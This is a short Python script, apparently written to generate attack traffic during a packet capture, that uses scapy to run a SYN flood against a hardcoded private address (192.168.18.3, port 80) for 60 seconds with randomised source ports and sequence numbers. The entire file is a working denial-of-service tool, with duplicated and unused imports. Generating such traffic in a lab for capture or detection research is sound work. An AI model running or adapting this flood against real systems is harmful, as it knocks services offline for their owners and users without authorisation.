import os
import time
from scapy.all import *
import subprocess


from scapy.all import *
import time

def syn_flood(target_ip, target_port, duration=30):
    print(f"[+] Starting SYN flood to {target_ip}:{target_port} for {duration}s")
    end_time = time.time() + duration
    while time.time() < end_time:
        send(
            IP(dst=target_ip)/TCP(
                sport=RandShort(), 
                dport=target_port, 
                flags="S", 
                seq=RandInt()
            ),
            verbose=0
        )
    print("[+] Attack completed")

# Usage (run during capture)

if __name__ == "__main__":
 syn_flood("192.168.18.3", 80, duration=60)